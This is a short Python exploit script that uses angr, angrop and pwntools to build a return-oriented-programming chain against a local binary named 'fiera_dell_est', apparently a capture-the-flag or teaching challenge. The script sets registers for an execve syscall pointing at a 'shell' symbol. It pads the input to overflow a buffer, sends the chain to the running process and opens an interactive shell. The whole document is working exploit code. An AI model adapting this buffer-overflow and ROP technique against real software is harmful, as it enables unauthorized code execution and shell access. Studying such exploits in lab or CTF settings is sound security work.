"""
Exploit write in angr with angrop module. It build a ROP attacks for "fiera_dell_est" binary.
It highlights the potentiality and the comfortable syntax
"""

import angr
import angrop
from pwn import *

file_path = 'fiera_dell_est'

EXE_FILE = file_path
exe = ELF(EXE_FILE)  # create ELF binary

p = angr.Project(file_path)  # create angr project
rop = p.analyses.ROP()  # create ROP object
rop.find_gadgets()  # find every gadgets in binary
# Order of register in set_regs() method:
# arg0: %ebx, arg1: %ecx, arg2: %edx, arg3: %esi, arg4: %edi, arg5: %ebp
chain = rop.set_regs(eax=0xb, ebx=exe.symbols['shell'], ecx=0x0, edx=0x0)  # build ROP chain with setting of register
chain += rop.func_call('angelo_della_morte', [])  # build ROP chain with function call

# print of chain string
print("ROP chain without padding:")
chain.print_payload_code()

ropchain = b'due\x00' + b'aaaaaaaaaaaa' + chain.payload_str()  # generate padding for exploit the buffer overflow vulnerability

io = process([EXE_FILE])   # executing the executable with ropchain as input
io.recvline()  # receive a single line from the communication tube
io.sendline(ropchain)  # send a single line from the communication tube
io.interactive()  # to manually interact with the spawn shell
